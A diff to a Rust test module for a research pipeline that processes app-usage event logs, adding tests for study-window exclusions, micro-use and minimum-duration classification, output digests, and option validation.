+            .collect::<Vec<_>>();
+        assert_eq!(top_apps, vec!["com.example.chat"]);
     }
 
     /// The day-coverage table tells a researcher, for every day of a
@@ -12324,6 +11475,7 @@ mod tests {
             participant_id: "P01".to_string(),
             start_date: "2026-03-06".to_string(),
             end_date: "2026-03-11".to_string(),
+            exclusions: Vec::new(),
         }];
         let windowed =
             incremental::build_coverage(&rows, &raw_dates, &windows).expect("windowed coverage");
@@ -12346,6 +11498,7 @@ mod tests {
             participant_id: "P01".to_string(),
             start_date: "2026-03-09".to_string(),
             end_date: "2026-03-10".to_string(),
+            exclusions: Vec::new(),
         }];
         let clipped =
             incremental::build_coverage(&rows, &raw_dates, &narrow).expect("clipped coverage");
@@ -12364,6 +11517,7 @@ mod tests {
             participant_id: "P02".to_string(),
             start_date: "2026-03-09".to_string(),
             end_date: "2026-03-10".to_string(),
+            exclusions: Vec::new(),
         }];
         assert!(
             incremental::build_coverage(&rows, &raw_dates, &other_window).is_ok_and(|coverage| {
@@ -12510,7 +11664,7 @@ mod tests {
             // A screen row is never retyped whatever the username says.
             ("P02", "2026-03-07", "Parent", SCREEN_USAGE, Some(5.0)),
         ]);
-        rows[4].edit_identity().app_package_name = "com.amazon.tahoe".into();
+        *rows[4].edit_classification().app_package_name = "com.amazon.tahoe".into();
         let survey_timestamp = rows[5].event_timestamp_ns;
 
         let resolution = SharingResolution {
@@ -12592,6 +11746,7 @@ mod tests {
             participant_id: "P01".to_string(),
             start_date: "2026-03-06".to_string(),
             end_date: "2026-03-08".to_string(),
+            exclusions: Vec::new(),
         }];
 
         let resolved = resolve_participant_windows(&rows, &windows);
@@ -12624,6 +11779,135 @@ mod tests {
         );
         assert_eq!(dropped, 2);
         assert_eq!(without_window, vec!["P02".to_string()]);
+    }
+
+    #[test]
+    fn labeled_study_window_exclusions_filter_rows_and_coverage_and_bind_the_checkpoint() {
+        let csv = b"participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n\
+P01,2026-03-05,2026-03-11,2026-03-09,2026-03-09,exam_week_8\n\
+P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,holiday_week_6\n\
+P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,holiday_week_6\n";
+        let windows = parse_study_windows(csv).expect("labeled exclusions parse");
+        assert_eq!(windows.len(), 1, "repeated participant rows aggregate");
+        assert_eq!(
+            windows[0]
+                .exclusions
+                .iter()
+                .map(|exclusion| (
+                    exclusion.start_date.as_str(),
+                    exclusion.end_date.as_str(),
+                    exclusion.label.as_str(),
+                ))
+                .collect::<Vec<_>>(),
+            vec![
+                ("2026-03-07", "2026-03-07", "holiday_week_6"),
+                ("2026-03-09", "2026-03-09", "exam_week_8"),
+            ],
+            "exclusions are sorted and exact duplicates are idempotent",
+        );
+
+        let ordinary =
+            parse_study_windows(b"participant_id,start_date,end_date\nP01,2026-03-05,2026-03-11\n")
+                .expect("ordinary study window parses");
+        assert_eq!(
+            serde_json::to_string(&ordinary).expect("serialize ordinary window"),
+            r#"[{"participant_id":"P01","start_date":"2026-03-05","end_date":"2026-03-11"}]"#,
+            "an ordinary study-window checkpoint retains its pre-exclusion wire shape",
+        );
+
+        let rows = usage_rows(&[
+            ("P01", "2026-03-05", "Target Child", APP_USAGE, Some(5.0)),
+            ("P01", "2026-03-06", "Target Child", APP_USAGE, Some(5.0)),
+            ("P01", "2026-03-07", "Target Child", APP_USAGE, Some(5.0)),
+            ("P01", "2026-03-08", "Target Child", APP_USAGE, Some(5.0)),
+            ("P01", "2026-03-09", "Target Child", APP_USAGE, Some(5.0)),
+            ("P01", "2026-03-10", "Target Child", APP_USAGE, Some(5.0)),
+            ("P01", "2026-03-11", "Target Child", APP_USAGE, Some(5.0)),
+        ]);
+        let resolved = resolve_participant_windows(&rows, &windows);
+        let (kept, dropped, without_window) = apply_study_window(rows.clone(), &resolved);
+        assert_eq!(
+            kept.iter().map(|row| row.date.as_str()).collect::<Vec<_>>(),
+            vec![
+                "2026-03-05",
+                "2026-03-06",
+                "2026-03-08",
+                "2026-03-10",
+                "2026-03-11",
+            ],
+        );
+        assert_eq!(dropped, 2);
+        assert!(without_window.is_empty());
+
+        let raw_dates = BTreeMap::from([(
+            "P01".to_string(),
+            (5..=11)
+                .map(|day| format!("2026-03-{day:02}"))
+                .collect::<BTreeSet<_>>(),
+        )]);
+        let coverage = incremental::build_coverage(&kept, &raw_dates, &windows)
+            .expect("excluded dates are absent from the coverage spine");
+        let coverage_csv = String::from_utf8(coverage.csv_bytes).expect("coverage is UTF-8");
+        assert!(!coverage_csv.contains("2026-03-07"));
+        assert!(!coverage_csv.contains("2026-03-09"));
+
+        let renamed = parse_study_windows(
+            b"participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n\
+P01,2026-03-05,2026-03-11,2026-03-09,2026-03-09,exam_week_16\n\
+P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,holiday_week_6\n",
+        )
+        .expect("renamed exclusion parses");
+        let checkpoint_digest = |windows: &[StudyWindow]| {
+            let resolved = resolve_participant_windows(&rows, windows);
+            let fingerprint = value_fingerprint(&resolved).expect("serialize resolved windows");
+            workflow_checkpoint(
+                "resolve_participant_windows",
+                &[],
+                &[("value", &fingerprint)],
+            )
+            .terminal_digest
+        };
+        assert_ne!(
+            checkpoint_digest(&windows),
+            checkpoint_digest(&renamed),
+            "the resolved-window receipt commits source labels even when dates and output are unchanged",
+        );
+    }
+
+    #[test]
+    fn malformed_study_window_exclusions_fail_closed() {
+        for (name, row) in [
+            (
+                "missing end",
+                "P01,2026-03-05,2026-03-11,2026-03-07,,holiday_week_6",
+            ),
+            (
+                "empty label",
+                "P01,2026-03-05,2026-03-11,2026-03-07,2026-03-07,",
+            ),
+            (
+                "reversed",
+                "P01,2026-03-05,2026-03-11,2026-03-08,2026-03-07,holiday_week_6",
+            ),
+            (
+                "outside window",
+                "P01,2026-03-05,2026-03-11,2026-03-11,2026-03-12,exam_week_8",
+            ),
+        ] {
+            let csv = format!(
+                "participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n{row}\n"
+            );
+            assert!(
+                parse_study_windows(csv.as_bytes()).is_err(),
+                "{name} must fail",
+            );
+        }
+        let conflicting = b"participant_id,start_date,end_date,exclusion_start_date,exclusion_end_date,exclusion_label\n\
+P01,2026-03-01,2026-03-31,2026-03-07,2026-03-07,holiday_week_6\n\
+P01,2026-03-02,2026-03-31,2026-03-08,2026-03-08,exam_week_8\n";
+        assert!(parse_study_windows(conflicting)
+            .expect_err("conflicting participant windows must fail")
+            .contains("conflicting study windows"));
     }
 
     /// Build paired episode rows for the reconstruction stages: an interaction
@@ -12720,11 +12004,19 @@ mod tests {
         };
 
         assert_eq!(
-            observed(incremental::classify_episode_durations(
-                rows.clone(),
-                &filtered,
-                60.0
-            )),
+            observed(
+                incremental::classify_episode_durations(
+                    rows.clone(),
+                    &filtered,
+                    MicroUseClassificationPolicy::None,
+                    60.0,
+                    MinimumDurationComparator::StrictLt,
+                    MinimumDurationDisposition::ChronicleBlankKeepRow,
+                    &[],
+                    &b06::MaximumDurationRowStage::omitted(),
+                )
+                .expect("classification with the omitted B06 shape never refuses")
+            ),
             vec![
                 (
                     APP_USAGE.to_string(),
@@ -12742,9 +12034,19 @@ mod tests {
 
         // With no floor at all every paired session keeps its duration.
         assert_eq!(
-            observed(incremental::classify_episode_durations(
-                rows, &filtered, 0.0
-            )),
+            observed(
+                incremental::classify_episode_durations(
+                    rows,
+                    &filtered,
+                    MicroUseClassificationPolicy::None,
+                    0.0,
+                    MinimumDurationComparator::StrictLt,
+                    MinimumDurationDisposition::ChronicleBlankKeepRow,
+                    &[],
+                    &b06::MaximumDurationRowStage::omitted(),
+                )
+                .expect("classification with the omitted B06 shape never refuses"),
+            ),
             vec![
                 (
                     APP_USAGE.to_string(),
@@ -12762,6 +12064,1574 @@ mod tests {
                     None
                 ),
             ]
+        );
+    }
+
+    #[test]
+    fn okoshi_micro_use_classification_is_positive_bounded_and_descriptive_only() {
+        const SECOND: i64 = 1_000_000_000;
+        let filtered = BTreeSet::new();
+        let rows = episode_rows(&[
+            (ACTIVITY_RESUMED, "com.example.zero", Some(0), Some(0)),
+            (
+                ACTIVITY_RESUMED,
+                "com.example.under",
+                Some(10 * SECOND),
+                Some(15 * SECOND - 1),
+            ),
+            (
+                ACTIVITY_RESUMED,
+                "com.example.equal",
+                Some(20 * SECOND),
+                Some(25 * SECOND),
+            ),
+            (
+                ACTIVITY_RESUMED,
+                "com.example.over",
+                Some(30 * SECOND),
+                Some(35 * SECOND + 1),
+            ),
+            (
+                END_OF_USAGE_MISSING,
+                "com.example.unbounded",
+                Some(40 * SECOND),
+                None,
+            ),
+        ]);
+
+        let baseline = incremental::classify_episode_durations(
+            rows.clone(),
+            &filtered,
+            MicroUseClassificationPolicy::None,
+            0.0,
+            MinimumDurationComparator::StrictLt,
+            MinimumDurationDisposition::ChronicleBlankKeepRow,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+        let classified = incremental::classify_episode_durations(
+            rows,
+            &filtered,
+            MicroUseClassificationPolicy::OkoshiLt5s,
+            0.0,
+            MinimumDurationComparator::StrictLt,
+            MinimumDurationDisposition::ChronicleBlankKeepRow,
+            &[],
+            &b06::MaximumDurationRowStage::omitted(),
+        )
+        .expect("classification with the omitted B06 shape never refuses");
+
+        let public_timing = |rows: &[Row]| {
+            rows.iter()
+                .map(|row| {
+                    (
+                        row.interaction_type.to_string(),
+                        row.start_timestamp_ns,
+                        row.stop_timestamp_ns,
+                        row.duration_seconds.map(f64::to_bits),
+                        row.duration_minutes.map(f64::to_bits),
+                        row.minimum_duration_qualified,
+                        row.minimum_duration_aggregate_eligible,
+                    )
+                })
+                .collect::<Vec<_>>()
+        };
+        assert_eq!(
+            public_timing(&classified),
+            public_timing(&baseline),
+            "B03 must not change timing, inclusion, or B04 qualification",
+        );
+        assert_eq!(
+            classified
+                .iter()
+                .map(|row| row.micro_use_classification)
+                .collect::<Vec<_>>(),
+            vec![
+                Some(MicroUseClassification::NotClassifiable),
+                Some(MicroUseClassification::MicroUse),
+                Some(MicroUseClassification::NotMicroUse),
+                Some(MicroUseClassification::NotMicroUse),
+                Some(MicroUseClassification::NotClassifiable),
+            ],
+        );
+        assert_eq!(
+            classified
+                .iter()
+                .map(|row| {
+                    (
+                        row.raw_episode_start_timestamp_ns,
+                        row.raw_episode_stop_timestamp_ns,
+                        row.raw_episode_duration_ns,
+                    )
+                })
+                .collect::<Vec<_>>(),
+            vec![
+                (Some(0), Some(0), Some(0)),
+                (
+                    Some(10 * SECOND),
+                    Some(15 * SECOND - 1),
+                    Some(5 * SECOND - 1)
+                ),
+                (Some(20 * SECOND), Some(25 * SECOND), Some(5 * SECOND)),
+                (
+                    Some(30 * SECOND),
+                    Some(35 * SECOND + 1),
+                    Some(5 * SECOND + 1)
+                ),
+                (Some(40 * SECOND), None, None),
+            ],
+            "classification must retain exact immutable episode evidence",
+        );
+    }
+
+    #[test]
+    fn minimum_duration_uses_exact_nanosecond_comparators_and_all_four_dispositions() {
+        const SECOND: i64 = 1_000_000_000;
+        let filtered = BTreeSet::new();
+        let no_background = AHashSet::new();
+        let rows = episode_rows(&[
+            (
+                ACTIVITY_RESUMED,
+                "com.example.under",
+                Some(0),
+                Some(60 * SECOND - 1),
+            ),
+            (
+                ACTIVITY_RESUMED,
+                "com.example.equal",
+                Some(100 * SECOND),
+                Some(160 * SECOND),
+            ),
+            (
+                ACTIVITY_RESUMED,
+                "com.example.over",
+                Some(200 * SECOND),
+                Some(260 * SECOND + 1),
+            ),
+        ]);
+
+        let classify = |micro_policy, comparator, disposition| {
+            incremental::classify_episode_durations(
+                rows.clone(),
+                &filtered,
+                micro_policy,
+                60.0,
+                comparator,
+                disposition,
+                &[],
+                &b06::MaximumDurationRowStage::omitted(),
+            )
+            .expect("classification with the omitted B06 shape never refuses")
+        };
+        assert_eq!(
+            classify(
+                MicroUseClassificationPolicy::None,
+                MinimumDurationComparator::StrictLt,
+                MinimumDurationDisposition::RetainAndCredit,
+            )
+            .iter()
+            .map(|row| row.minimum_duration_qualified)
+            .collect::<Vec<_>>(),
+            vec![Some(true), Some(false), Some(false)],
+        );
+        assert_eq!(
+            classify(
+                MicroUseClassificationPolicy::OkoshiLt5s,
+                MinimumDurationComparator::InclusiveLe,
+                MinimumDurationDisposition::RetainAndCredit,
+            )
+            .iter()
+            .map(|row| row.minimum_duration_qualified)
+            .collect::<Vec<_>>(),
+            vec![Some(true), Some(true), Some(false)],
+            "B03 policy selection must not alter B04 qualification",
+        );
+
+        for disposition in MinimumDurationDisposition::ALL {
+            let classified = classify(
+                MicroUseClassificationPolicy::None,
+                MinimumDurationComparator::InclusiveLe,
+                disposition,
+            );
+            let mut options = test_options();
+            options.minimum_usage_duration = 60.0;
+            options.minimum_duration_comparator = MinimumDurationComparator::InclusiveLe;
+            options.minimum_duration_disposition = disposition;
+            let evidence = foundational_semantics_evidence(&classified, &options);
+            assert_eq!(evidence.minimum_duration.bounded_episode_count, 3);
+            assert_eq!(evidence.minimum_duration.qualifying_count, 2);
+            assert_eq!(
+                evidence.minimum_duration.checkpoint,
+                FOUNDATIONAL_SEMANTICS_CHECKPOINT,
+            );
+
+            match disposition {
+                MinimumDurationDisposition::ChronicleBlankKeepRow => {
+                    assert_eq!(
+                        classified
+                            .iter()
+                            .map(|row| row.duration_seconds.map(f64::to_bits))
+                            .collect::<Vec<_>>(),
+                        vec![None, None, Some((60.000_000_001_f64).to_bits())],
+                    );
+                    assert!(classified
+                        .iter()
+                        .all(|row| row.minimum_duration_aggregate_eligible));
+                    assert_eq!(evidence.minimum_duration.retained_excluded_count, 2);
+                    assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
+                }
+                MinimumDurationDisposition::RetainAndCredit => {
+                    assert!(classified.iter().all(|row| row.duration_seconds.is_some()));
+                    assert!(classified
+                        .iter()
+                        .all(|row| row.minimum_duration_aggregate_eligible));
+                    assert_eq!(evidence.minimum_duration.retained_credited_count, 3);
+                    assert!(evidence.minimum_duration_excluded_episodes.is_empty());
+                }
+                MinimumDurationDisposition::RetainButExclude => {
+                    assert!(classified.iter().all(|row| row.duration_seconds.is_some()));
+                    assert_eq!(
+                        classified
+                            .iter()
+                            .map(|row| row.minimum_duration_aggregate_eligible)
+                            .collect::<Vec<_>>(),
+                        vec![false, false, true],
+                    );
+                    assert_eq!(evidence.minimum_duration.retained_excluded_count, 2);
+                    assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
+                }
+                MinimumDurationDisposition::DropRow => {
+                    assert_eq!(
+                        classified
+                            .iter()
+                            .map(|row| row.minimum_duration_drop_pending)
+                            .collect::<Vec<_>>(),
+                        vec![true, true, false],
+                    );
+                    assert_eq!(evidence.minimum_duration.dropped_count, 2);
+                    assert_eq!(evidence.minimum_duration_excluded_episodes.len(), 2);
+                    let retained = incremental::apply_app_inclusion_policy(
+                        classified,
+                        &filtered,
+                        &AHashSet::new(),
+                        &no_background,
+                    );
+                    assert_eq!(retained.len(), 1);
+                    assert_eq!(retained[0].app_package_name, "com.example.over");
+                }
+            }
+        }
+    }
+
+    #[test]
+    fn omitted_and_explicit_foundational_defaults_share_product_bytes_but_not_complete_identity() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:01,UTC\n",
+        );
+        let mut omitted = test_options();
+        omitted.timezone = "UTC".into();
+        omitted.correct_duplicate_event_timestamps = false;
+        omitted.enable_aggregates = true;
+        let mut explicit = omitted.clone();
+        explicit.micro_use_classification_policy_explicit = true;
+        explicit.minimum_usage_duration_explicit = true;
+        explicit.minimum_duration_comparator_explicit = true;
+        explicit.minimum_duration_disposition_explicit = true;
+
+        let omitted_result = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &omitted,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("omitted native baseline");
+        let explicit_result = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &explicit,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("explicit equivalent baseline");
+
+        assert_eq!(omitted_result.app_csv_bytes, explicit_result.app_csv_bytes);
+        assert_eq!(
+            omitted_result.screen_csv_bytes,
+            explicit_result.screen_csv_bytes
+        );
+        assert_eq!(
+            omitted_result.review_summary_json_bytes,
+            explicit_result.review_summary_json_bytes,
+        );
+        assert_eq!(
+            omitted_result.visualization_data_json_bytes,
+            explicit_result.visualization_data_json_bytes,
+        );
+        assert_eq!(
+            serde_json::to_vec(&*omitted_result.aggregate_csv_outputs).unwrap(),
+            serde_json::to_vec(&*explicit_result.aggregate_csv_outputs).unwrap(),
+        );
+        assert_eq!(
+            serde_json::to_vec(&*omitted_result.row_lineage).unwrap(),
+            serde_json::to_vec(&*explicit_result.row_lineage).unwrap(),
+        );
+        assert_eq!(
+            omitted_result
+                .foundational_semantics_evidence
+                .micro_use
+                .relation,
+            "baseline_native",
+        );
+        assert_eq!(
+            explicit_result
+                .foundational_semantics_evidence
+                .micro_use
+                .relation,
+            "baseline_equivalent",
+        );
+        assert_eq!(
+            omitted_result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .relation,
+            "baseline_native",
+        );
+        assert_eq!(
+            explicit_result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .relation,
+            "baseline_equivalent",
+        );
+        assert_eq!(
+            omitted_result.workflow_query_digests["classify_episode_durations"],
+            explicit_result.workflow_query_digests["classify_episode_durations"],
+            "presence-only edits must not rerun or re-identify classification",
+        );
+        assert_ne!(
+            omitted_result.workflow_query_digests["assemble_result_manifest"],
+            explicit_result.workflow_query_digests["assemble_result_manifest"],
+            "complete result identity must commit receipt relation",
+        );
+        assert_ne!(
+            serde_json::to_vec(&omitted_result).unwrap(),
+            serde_json::to_vec(&explicit_result).unwrap(),
+        );
+    }
+
+    #[test]
+    fn detached_default_b04_boundary_commits_all_scientific_product_bytes() {
+        // Independent oracle provenance: these five commitments were emitted
+        // from a detached worktree at the exact pre-B03/B04/B05 baseline
+        // 080801a0232a6a2c97daba0c986094f6cf48fe08, using this same raw fixture
+        // and its historical `PipelineV2Options` (minimum=60) in a temporary
+        // test-only probe:
+        //
+        //   git worktree add --detach <tmp> 080801a0232a6a2c97daba0c986094f6cf48fe08
+        //   cargo test --features incremental-v2 detached_b04_boundary_oracle_probe -- --nocapture
+        //
+        // The probe printed length + SHA-256 for each historical product.  It
+        // was not run against, copied from, or linked to this moving tree.
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Under,Activity Resumed,com.example.under,2026-03-07 10:00:00.000000000,UTC\n",
+            "Study,P01,Child,Under,Activity Paused,com.example.under,2026-03-07 10:00:59.999999999,UTC\n",
+            "Study,P01,Child,Equal,Activity Resumed,com.example.equal,2026-03-07 10:02:00.000000000,UTC\n",
+            "Study,P01,Child,Equal,Activity Paused,com.example.equal,2026-03-07 10:03:00.000000000,UTC\n",
+            "Study,P01,Child,Over,Activity Resumed,com.example.over,2026-03-07 10:04:00.000000000,UTC\n",
+            "Study,P01,Child,Over,Activity Paused,com.example.over,2026-03-07 10:05:00.000000001,UTC\n",
+        );
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.correct_duplicate_event_timestamps = false;
+        options.enable_aggregates = true;
+        options.minimum_usage_duration = 60.0;
+        options.minimum_usage_duration_explicit = false;
+        options.minimum_duration_comparator = MinimumDurationComparator::StrictLt;
+        options.minimum_duration_comparator_explicit = false;
+        options.minimum_duration_disposition = MinimumDurationDisposition::ChronicleBlankKeepRow;
+        options.minimum_duration_disposition_explicit = false;
+        let result = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("detached B04 boundary fixture");
+        let app_records = parse_csv_to_records(&result.app_csv_bytes.to_vec());
+        let record = |package: &str| {
+            app_records
+                .iter()
+                .find(|row| row["app_package_name"] == package)
+                .unwrap_or_else(|| panic!("missing public boundary row for {package}"))
+        };
+        let under = record("com.example.under");
+        assert_eq!(under["start_timestamp"], "03-07-2026 10:00:00");
+        assert_eq!(under["stop_timestamp"], "03-07-2026 10:00:59");
+        assert_eq!(under["duration_seconds"], "");
+        assert_eq!(under["duration_minutes"], "");
+        let equal = record("com.example.equal");
+        assert_eq!(equal["start_timestamp"], "03-07-2026 10:02:00");
+        assert_eq!(equal["stop_timestamp"], "03-07-2026 10:03:00");
+        assert_eq!(equal["duration_seconds"], "60.0");
+        assert_eq!(equal["duration_minutes"], "1.0");
+        let over = record("com.example.over");
+        assert_eq!(over["start_timestamp"], "03-07-2026 10:04:00");
+        assert_eq!(over["stop_timestamp"], "03-07-2026 10:05:00");
+        assert_eq!(over["duration_seconds"], "60.000000001");
+        assert_eq!(over["duration_minutes"], "1.0000000000166667");
+        let aggregate_manifest = result
+            .aggregate_csv_outputs
+            .iter()
+            .map(|output| {
+                format!(
+                    "{}|{}|{}|sha256:{}\n",
+                    output.kind,
+                    output.row_count,
+                    output.bytes.len(),
+                    hex::encode(Sha256::digest(output.bytes.to_vec())),
+                )
+            })
+            .collect::<String>()
+            .into_bytes();
+        let lineage = serde_json::to_vec(&*result.row_lineage).unwrap();
+        let app_csv = result.app_csv_bytes.to_vec();
+        let review_json = result.review_summary_json_bytes.to_vec();
+        let visualization_json = result.visualization_data_json_bytes.to_vec();
+        let actual = [
+            ("app_csv", app_csv.as_slice()),
+            ("review_json", review_json.as_slice()),
+            ("visualization_json", visualization_json.as_slice()),
+            ("aggregate_manifest", aggregate_manifest.as_slice()),
+            ("lineage", lineage.as_slice()),
+        ]
+        .map(|(name, bytes)| {
+            (
+                name,
+                bytes.len(),
+                format!("sha256:{}", hex::encode(Sha256::digest(bytes))),
+            )
+        });
+        let expected = [
+            (
+                "app_csv",
+                1_343,
+                "sha256:e1c7b5d462c157aff1f49d71fc18b9093a78314c9dd142f7a42e4e1e11d6e260",
+            ),
+            (
+                "review_json",
+                614,
+                "sha256:03a0ae00cbc5129e10e6347b44f05e07b9216c42e0a11ba2b30c33072f97d04f",
+            ),
+            (
+                "visualization_json",
+                885,
+                "sha256:fde3266a33c0c3e2d6c176df11c7f35966a59d27d20e176b06e3605a68e5aeea",
+            ),
+            (
+                "aggregate_manifest",
+                314,
+                "sha256:891e13626146d13d335d04b18b51663b7ea1eb59a9a2399f902330fb98de0ed4",
+            ),
+            (
+                "lineage",
+                1_420,
+                "sha256:7f7ff244819886f3cbd603ecf6b9da11ed25896b12dd6a6ce2f222488bda5e9f",
+            ),
+        ];
+        assert_eq!(
+            actual.map(|(name, length, digest)| (name, length, digest)),
+            expected.map(|(name, length, digest)| (name, length, digest.to_string())),
+            "detached omitted-B04 baseline bytes drifted",
+        );
+        assert_eq!(
+            result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .relation,
+            "baseline_native",
+        );
+        assert_eq!(
+            result
+                .foundational_semantics_evidence
+                .minimum_duration
+                .qualifying_count,
+            1,
+        );
+    }
+
+    #[test]
+    fn default_placeholder_fixture_bytes_are_unchanged_by_observation_eligibility_separation() {
+        let raw = concat!(
+            "study_id,participant_id,username,application_label,interaction_type,app_package_name,event_timestamp,timezone\n",
+            "Study,P01,Child,Chat,Activity Resumed,com.example.chat,2026-03-07 10:00:00,UTC\n",
+            "Study,P01,Child,Chat,Activity Paused,com.example.chat,2026-03-07 10:01:01,UTC\n",
+            "Study,P01,Child,System,User Interaction,android,2026-03-08 10:00:00,UTC\n",
+        );
+        let mut options = test_options();
+        options.timezone = "UTC".into();
+        options.correct_duplicate_event_timestamps = false;
+        options.add_no_activity_placeholder_days = true;
+        let result = run_pipeline_v2_with_supports(
+            raw.as_bytes(),
+            &options,
+            PipelineV2SupportFiles::default(),
+        )
+        .expect("default placeholder compatibility fixture");
+        let csv = String::from_utf8_lossy(&result.app_csv_bytes.to_vec()).into_owned();
+        assert!(csv.contains("com.example.chat"));
+        assert_eq!(csv.matches("com.placeholder.noactivity").count(), 1);
+        // The default rows are all eligible, making the old and repaired
+        // observation predicates extensionally identical on this independent
+        // compatibility witness. Commit its exact output so a future change
+        // cannot quietly widen the default projection while preserving only
+        // the row-count assertions above.
+        assert_eq!(
+            format!(
+                "sha256:{}",
+                hex::encode(Sha256::digest(result.app_csv_bytes.to_vec()))
+            ),
+            "sha256:1c0df5dd180cfcf3e587d4fed7affd1924a12fae0c9ea6b2c194e920348af96d",
+        );
+    }
+
+    #[test]
+    fn malformed_minimum_duration_is_rejected_before_decode_or_reconstruction() {
+        let cases = [
+            (
+                f64::NAN,
+                PipelineV2OptionsValidationError::MinimumUsageDurationNonFinite,
+            ),
+            (
+                f64::INFINITY,
+                PipelineV2OptionsValidationError::MinimumUsageDurationNonFinite,
+            ),
+            (
+                -1.0,
+                PipelineV2OptionsValidationError::MinimumUsageDurationNegative,
+            ),
+            (
+                10_000_000_000.0,
+                PipelineV2OptionsValidationError::MinimumUsageDurationNanosecondOverflow,
+            ),
+        ];
+        for (threshold, expected) in cases {
+            let mut options = test_options();
+            options.minimum_usage_duration = threshold;
+            assert_eq!(validate_pipeline_v2_options(&options), Err(expected));
+            B05_PREPARE_DECODE_COUNT.with(|count| count.set(0));
+            let error = match run_pipeline_v2_with_supports(
+                b"this is deliberately not decoded",
+                &options,
+                PipelineV2SupportFiles::default(),
+            ) {
+                Ok(_) => panic!("malformed B04 threshold must fail closed"),
+                Err(error) => error,
+            };
+            assert_eq!(error, expected.to_string());
+            assert_eq!(
+                B05_PREPARE_DECODE_COUNT.with(Cell::get),
+                0,
+                "threshold {threshold:?} reached raw decode",
+            );
+        }
+
+        let mut zero = test_options();
+        zero.minimum_usage_duration = 0.0;
+        assert_eq!(validate_pipeline_v2_options(&zero), Ok(()));
+        let mut largest_representable = zero;
+        largest_representable.minimum_usage_duration = 9_000_000_000.0;
+        assert_eq!(validate_pipeline_v2_options(&largest_representable), Ok(()));
+    }
+
+    /// The three B06 validation scopes: a malformed vector is an error under
+    /// `Complete` and `MalformedOnly`; a legal vector refused for the selected
+    /// strategy or provider is an error only under `Complete`; `Skip` judges
+    /// nothing about B06 but still runs the non-B06 checks.
+    #[test]
+    fn maximum_duration_validation_scopes_separate_malformed_vectors_from_typed_refusals() {
+        use b06::MaximumDurationRefusalReason as Reason;
+        let with_vector =
+            |policy: &str, disposition: &str, source: &str, threshold: Option<&str>| {
+                let mut options = test_options();
+                options.maximum_duration = b06::MaximumDurationRequest {
+                    policy: Some(policy.into()),
+                    disposition: Some(disposition.into()),
+                    threshold_source: Some(source.into()),
+                    threshold_ns: threshold.map(str::to_string),
+                    long_duration_threshold_explicit: false,
+                    legacy_threshold_hours_canonical: Some("12".into()),
+                    legacy_threshold_ns_canonical: Some("43200000000000".into()),
+                };
+                options.long_duration_threshold_ns = 43_200_000_000_000;
+                options
+            };
+        let malformed = with_vector(
+            "post_reconstruction_strict_max_v1",
+            "flag_and_retain",
+            "fixed_parameter",
+            Some("01"),
+        );
+        let mut incompatible = with_vector(
+            "chronicle_observed_close_rejection_v1",
+            "not_applicable",
+            "chronicle_legacy_config",
+            None,
+        );
+        incompatible.episode_reconstruction_strategy =
+            EpisodeReconstructionStrategy::GesisStartStopRepair;
+        let adaptive = with_vector(
+            "post_reconstruction_strict_max_v1",
+            "flag_and_retain",
+            "b12_adaptive_participant",
+            None,
+        );
+        let legal = with_vector(
+            "post_reconstruction_strict_max_v1",
+            "flag_and_retain",
+            "fixed_parameter",
+            Some("1"),
+        );
+
+        for scope in [
+            MaximumDurationValidation::Complete,
+            MaximumDurationValidation::MalformedOnly,
+        ] {
+            assert_eq!(
+                validate_pipeline_v2_options_with(&malformed, scope),
+                Err(PipelineV2OptionsValidationError::MaximumDuration(
+                    Reason::ThresholdMalformed
+                )),
+                "{scope:?}"
+            );
+        }
+        assert_eq!(
+            validate_pipeline_v2_options_with(&malformed, MaximumDurationValidation::Skip),
+            Ok(())
+        );
+
+        for (options, reason) in [
+            (
+                &incompatible,
+                Reason::PolicyIncompatibleWithReconstructionStrategy,
+            ),
+            (
+                &adaptive,
+                Reason::AdaptiveMaximumThresholdProviderUnavailable,
+            ),
+        ] {
+            assert!(reason.is_applicability_refusal());
+            assert_eq!(
+                validate_pipeline_v2_options(options),
+                Err(PipelineV2OptionsValidationError::MaximumDuration(reason))
+            );
+            assert_eq!(
+                validate_pipeline_v2_options_with(
+                    options,
+                    MaximumDurationValidation::MalformedOnly
+                ),
+                Ok(())
+            );
+            assert_eq!(
+                validate_pipeline_v2_options_with(options, MaximumDurationValidation::Skip),
+                Ok(())
+            );
+        }
+        for scope in [
+            MaximumDurationValidation::Complete,
+            MaximumDurationValidation::MalformedOnly,
+            MaximumDurationValidation::Skip,
+        ] {
+            assert_eq!(
+                validate_pipeline_v2_options_with(&legal, scope),
+                Ok(()),
+                "{scope:?}"
+            );
+            // The non-B06 checks run under every scope.
+            let mut bad_b04 = legal.clone();
+            bad_b04.minimum_usage_duration = -1.0;
+            assert_eq!(
+                validate_pipeline_v2_options_with(&bad_b04, scope),
+                Err(PipelineV2OptionsValidationError::MinimumUsageDurationNegative),
+                "{scope:?}"
+            );
+        }
+        // Only the two strategy/provider reasons are applicability refusals.
+        for reason in [
+            Reason::RequestShapeInvalid,
+            Reason::ThresholdMalformed,
+            Reason::LegacyThresholdNonpositive,
+            Reason::LegacyThresholdNotIntegerNs,
